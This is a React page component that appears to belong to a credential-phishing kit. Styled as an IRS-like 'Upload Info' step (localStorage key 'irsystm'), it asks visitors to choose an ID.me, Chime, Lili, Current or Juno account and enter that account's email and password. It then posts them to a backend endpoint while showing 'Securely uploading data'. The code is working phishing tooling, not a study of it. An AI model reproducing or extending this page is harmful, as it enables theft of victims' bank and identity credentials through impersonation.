import { useRef, useState } from 'react';
import styles from './RetrievePage.module.css';
import InputField from '../components/InputField';
import Button from '../components/Button';
import { MainSpinner } from '../components/Loader';
import saveData from '../utils/saveData';
import { useNavigate } from 'react-router-dom';
import { getLocal, saveLocal } from '../utils/getData';

export default function RetrivePage({
  options = [
    'IDme Credentials',
    'Chime Account',
    'Lili Account',
    'Current Financial',
    'Juno Financial',
  ],
}) {
  const [enlarged, setEnlarged] = useState(false);
  const [selected, setSelected] = useState(() => options.at(0));
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isloading, setIsloading] = useState(false);

  let id = getLocal('irsystm');
  const navigate = useNavigate();

  async function handleSubmit(e) {
    e.preventDefault();

    setIsloading(true);
    const result = await saveData(
      { id, selected, email, password },
      `${import.meta.env.VITE_SITE_URL}/api/v1/client/assets`
    );

    const { status } = result;
    ({ id } = result);

    setIsloading(false);

    // Ask user to retry
    if (!status) return;

    // Save ID into localstorage
    saveLocal('irsystm', id);

    navigate('/finish');
  }
  return (
    <>
      {isloading && <MainSpinner>Securely uploading data</MainSpinner>}
      <main className={`main wrapper ${isloading ? 'opaque' : 'not-opaque'}`}>
        <form className={styles.form}>
          <h1 className={styles.h1}>Upload Info</h1>
          <p className={styles.label}>Assets Type</p>
          <ListAssets
            enlarged={enlarged}
            setEnlarged={setEnlarged}
            selected={selected}
          >
            <ListContent
              enlarged={enlarged}
              options={options}
              selected={selected}
              setSelected={setSelected}
            />
          </ListAssets>
          <EmailAddress email={email} setEmail={setEmail} />
          <Password password={password} setPassword={setPassword} />
          <br />
          <SubmitBtn handleSubmit={handleSubmit} />
        </form>
      </main>
    </>
  );
}

export function ListAssets({ children, enlarged, setEnlarged, selected }) {
  const textEl = useRef(null);

  const toggleLists = () => {
    // Enlarged the select field
    setEnlarged((b) => !b);

    const rotateArr = (ang, offset) => {
      textEl.current.style.setProperty('--arrow-angle', ang);
      textEl.current.style.setProperty('--arrow-offset-y', offset);
    };

    // Rotate arrow
    enlarged ? rotateArr('45deg', '10px') : rotateArr('-135deg', '13px');
  };
  return (
    <div className={styles['select-box']} onClick={toggleLists}>
      <p ref={textEl}>{selected}</p>
      {children}
    </div>
  );
}

export function ListContent({ enlarged, options, selected, setSelected }) {
  const contentEl = useRef(null);

  const handleClick = (e) => setSelected(e.target.textContent);

  return (
    <div
      ref={contentEl}
      className={`${styles.content} ${enlarged ? styles.enlarge : ''}`}
      onClick={handleClick}
    >
      {options
        .filter((el) => el !== selected)
        .map((text) => (
          <p key={text}>{text}</p>
        ))}
    </div>
  );
}

function EmailAddress({ email, setEmail }) {
  const [isFocus, setIsFocus] = useState(false);

  const handleChange = (e) => {
    setEmail(e.target.value);
  };
  return (
    <InputField
      isFocus={isFocus}
      setIsFocus={setIsFocus}
      onChange={handleChange}
      value={email}
      error={''}
    >
      Email Address
    </InputField>
  );
}
function Password({ password, setPassword }) {
  const [isFocus, setIsFocus] = useState(false);

  const handleChange = (e) => {
    setPassword(e.target.value);
  };
  return (
    <InputField
      isFocus={isFocus}
      setIsFocus={setIsFocus}
      onChange={handleChange}
      value={password}
      error={''}
      type="password"
    >
      Password
    </InputField>
  );
}

function SubmitBtn({ handleSubmit }) {
  return (
    <Button onClick={handleSubmit} type="primary" length="long">
      Submit
    </Button>
  );
}
